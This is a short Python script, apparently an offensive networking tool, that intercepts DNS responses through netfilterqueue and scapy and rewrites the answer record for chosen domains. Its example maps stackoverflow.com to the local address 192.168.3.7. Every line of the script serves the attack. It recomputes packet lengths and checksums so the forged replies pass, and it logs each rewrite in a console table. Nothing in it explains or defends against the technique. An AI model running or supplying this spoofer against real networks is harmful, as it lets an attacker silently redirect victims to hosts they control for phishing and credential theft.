from typing import Dict
import scapy.all as scapy
import netfilterqueue
from rich.table import Table
from rich.console import Console
import time

class DNSSpoofing:
    def __init__(self, spoofing_dict: Dict[str, str]):
        self.spoofing_dict = spoofing_dict
        self.queue = netfilterqueue.NetfilterQueue()

        self.table = Table(title="DNS Spoofing")
        self.table.add_column("Time", style="cyan", no_wrap=True)
        self.table.add_column("Source", style="magenta")
        self.table.add_column("Destination", style="green")
        self.table.add_column("Old Packet Summary", style="red")
        self.table.add_column("New Packet Summary", style="yellow")
        self.console = Console()
        self.queue.bind(0, self._intercept_packet)
        self.queue.run()

    def _intercept_packet(self, packet):
        print(packet)
        scapy_packet = scapy.IP(packet.get_payload())
        if scapy_packet.haslayer(scapy.DNSRR):
            scapy_packet = self._spoof(scapy_packet)
            packet.set_payload(bytes(scapy_packet))
        self.console.clear()
        self.console.print(self.table)
        packet.accept()


    def _spoof(self, packet):
        qname = ""
        try:
            qname = packet[scapy.DNSQR].qname.decode()
        except:
            pass
        if qname not in self.spoofing_dict:
            return packet
        old_packet = packet.copy()
        packet[scapy.DNS].an = scapy.DNSRR(rrname=qname, rdata=self.spoofing_dict[qname])
        packet[scapy.DNS].ancount = 1
        del packet[scapy.IP].len
        del packet[scapy.IP].chksum
        del packet[scapy.UDP].len
        del packet[scapy.UDP].chksum
        self.table.add_row(time.strftime("%H:%M:%S"), old_packet[scapy.IP].src, old_packet[scapy.IP].dst, old_packet.summary(), packet.summary())
        return packet

if __name__ == "__main__":
    spoofing_dict = { "stackoverflow.com.": "192.168.3.7" }
    DNSSpoofing(spoofing_dict)